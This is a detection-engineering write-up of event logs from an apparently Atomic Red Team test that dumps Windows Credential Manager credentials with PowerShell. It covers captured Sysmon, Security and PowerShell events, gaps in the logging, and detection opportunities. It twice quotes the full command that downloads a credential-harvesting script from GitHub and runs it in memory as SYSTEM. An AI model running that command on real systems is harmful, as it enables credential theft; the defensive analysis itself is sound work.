# T1555-2: Credentials from Password Stores — Dump Credentials from Windows Credential Manager With PowerShell (Windows Credentials)

## Technique Context

T1555 covers credential theft from password stores. This test targets the Windows Credentials vault in the Windows Credential Manager using a publicly available PowerShell script — `GetCredmanCreds.ps1` from the TriggerMan-S/Windows-Credential-Manager GitHub repository. The script uses P/Invoke or .NET interop to invoke the native Windows `CredEnumerate` API, which iterates all credentials stored in the vault and returns them including their plaintext (or DPAPI-protected) passwords.

The Windows Credentials vault stores domain authentication tokens, saved network share passwords, and credentials explicitly stored by users or applications. Unlike the Web Credentials vault (targeted by T1555-3), these are typically higher-value targets in domain environments — they may contain RDP credentials, mapped drive passwords, or domain service account credentials.

The test downloads and executes the script at runtime via `IEX (IWR ...)` — a memory-only execution pattern that avoids writing the payload to disk. This ran on ACME-WS06 with Defender disabled.

## What This Dataset Contains

The dataset contains 170 total events: 40 Sysmon events, 126 PowerShell operational events, and 4 Security events.

**Sysmon EID 1 (Process Create)** captures the attack execution:

```
CommandLine: "powershell.exe" & {IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force}
CurrentDirectory: C:\Windows\TEMP\
User: NT AUTHORITY\SYSTEM
IntegrityLevel: System
```

The command line is complete and unambiguous: the script is fetched from a specific GitHub commit hash (`4ad208e7...`), loaded into memory via `IEX`, and the `Get-PasswordVaultCredentials` function is invoked with `-Force`. The commit hash pinning is standard ART test practice ensuring reproducibility.

The ART test framework `whoami.exe` identity check also appears as Sysmon EID 1.

**Sysmon EID 7 (Image Load)** accounts for 25 events, the dominant category, recording DLL loads into the PowerShell host process.

**Sysmon EID 10 (Process Access)** captures 4 events showing the parent PowerShell process accessing child processes at full access (`0x1FFFFF`).

**Sysmon EID 17 (Pipe Create)** captures 3 events with the `\PSHost.*` naming pattern.

**Sysmon EID 11 (File Create)** captures 2 events for PowerShell profile data.

The Sysmon eid_breakdown also shows 1 EID 22 (DNS Query) and 1 EID 3 (Network Connection), which are not in the 20-event sample but confirm the outbound connection to download the script from GitHub was recorded.

**Security EID 4688** captures four process creation events. The command line for the attack process is recorded:

```
Process Command Line: "powershell.exe" & {IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force}
```

**PowerShell EID 4104** captures 120 script block events across multiple PowerShell instances. The sampled events are primarily boilerplate (`Set-StrictMode`, `Set-ExecutionPolicy Bypass -Scope Process -Force`, `$ErrorActionPreference = 'Continue'`). The actual `GetCredmanCreds.ps1` function body would appear in EID 4104 since it is downloaded and executed in-memory — those script blocks would contain the `CredEnumerate` P/Invoke code.

## What This Dataset Does Not Contain

**No Security EID 5379 (Credential Manager credentials were read).** This is the dedicated Windows security audit event for Credential Manager enumeration. Its absence in this dataset (compared to T1555-4 where it does appear) suggests that the `CredEnumerate` API access via PowerShell P/Invoke does not consistently trigger this audit event, or that the specific audit subcategory (`Audit Credential Validation` or `Audit Other Logon/Logoff Events`) was not enabled at the level required to capture it here.

**The `GetCredmanCreds.ps1` function body is not in the sampled script block logs.** The 120 EID 4104 events are dominated by boilerplate. The actual P/Invoke code for `CredEnumerate` would be in the non-sampled script blocks.

**No credential output.** Any credentials returned by `Get-PasswordVaultCredentials` are not captured in event logs.

**No file writes** from this test — the script is executed entirely in memory.

## Assessment

With Defender disabled, `Get-PasswordVaultCredentials` executes against the Windows Credentials vault without obstruction. The dataset clearly captures the delivery mechanism via the process creation command line. Compared to the defended variant (48 PowerShell events, 26 Sysmon, 12 Security), the undefended run shows higher PowerShell event volume (126 events) consistent with the script executing to completion, and fewer Security events because Defender's remediation processes are absent.

The confirmed presence of Sysmon EID 3 and EID 22 in the full dataset (outside the sample window) indicates the network download of `GetCredmanCreds.ps1` was captured — the script cannot execute without this network connection, making the DNS resolution and TCP connection to GitHub a prerequisite event that would appear before the credential access.

The use of a specific commit hash in the GitHub URL is an ART artifact (ensuring test reproducibility) that would be unusual in a real attack, which might use the HEAD of a repository or a different delivery mechanism entirely.

## Detection Opportunities Present in This Data

**Sysmon EID 1** captures the complete command line including the GitHub URL, the commit hash, the `IEX`/`IWR` pattern, and the function name `Get-PasswordVaultCredentials`. Any of these elements provide detection anchors.

**Security EID 4688** provides the same command line through the Security event channel for environments without Sysmon.

**Sysmon EID 3 and EID 22** (confirmed present) capture the outbound connection from PowerShell (running as SYSTEM) to `raw.githubusercontent.com` for the credential-stealing script. A SYSTEM-context PowerShell process making outbound HTTPS connections to GitHub raw content is unusual enough to warrant investigation.

**PowerShell EID 4104** would capture the `Get-PasswordVaultCredentials` function body including P/Invoke declarations for `CredEnumerate`, which is a distinctive pattern in script block logs.

The temporal sequence visible in this data — `whoami.exe` (identity check) followed immediately by PowerShell downloading and executing a credential harvesting script — is a behavioral cluster that should trigger investigation. The 1-2 second window between `whoami` and the credential access command (both running as SYSTEM from TEMP) is a pattern consistent with automated attack tooling.
